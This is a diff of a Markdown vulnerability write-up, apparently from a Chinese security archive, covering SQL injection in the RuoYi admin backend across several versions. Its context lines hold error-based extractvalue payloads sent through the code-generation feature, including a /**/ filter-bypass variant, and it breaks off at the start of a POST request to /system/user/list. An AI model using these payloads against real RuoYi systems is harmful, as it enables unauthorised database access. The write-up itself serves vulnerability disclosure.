@@ -5,8 +5,8 @@ source: "gelusus/wxvl 公众号漏洞文库"
 #  RuoYi 后台SQL注入漏洞系列2  
 安全艺术  安全艺术   2026-01-09 08:50  
   
-# 1. RuoYi（4.7.1-4.7.4）  
-## 1.1. SQL注入  
+# 1. RuoYi（4.7.1-4.7.4）  
+## 1.1. SQL注入  
   
 代码生成-创建  
 ```
@@ -16,8 +16,8 @@ CREATE table a1 as SELECT extractvalue(1,concat(0x7e,(select database())));
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDp8ZlnXxsAmO3Pe4YGQeX2ZUZAlEiayFgD0ewXzicaYhvyqiayMlMviaEXNA/640?wx_fmt=png&from=appmsg "")  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpxXxU0OJFxtRwwAoQzTXnWpXyrpTVueiaIgJHLg46GJXmedLmI5c7PmQ/640?wx_fmt=png&from=appmsg "")  
-# 2. RuoYi-4.7.5  
-## 2.1. SQL注入  
+# 2. RuoYi-4.7.5  
+## 2.1. SQL注入  
   
 代码生成-创建  
   
@@ -29,8 +29,8 @@ CREATE table a1 as SELECT/**/extractvalue(1,concat(0x7e,(select/**/database())))
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/X5epWh2K2OrzLh2U99GmicKpe0iaARLfDpr6INqH5QEabcPaokHoJHKURdDYg5WZhfHplK0h7vwyIE3qql2oyX1Q/640?wx_fmt=png&from=appmsg "")  
-# 3. RuoYi-4.8.2  
-## 3.1. SQL注入  
+# 3. RuoYi-4.8.2  
+## 3.1. SQL注入  
 ```
 POST /system/user/list HTTP/1.1
 Host: 192.168.3.102
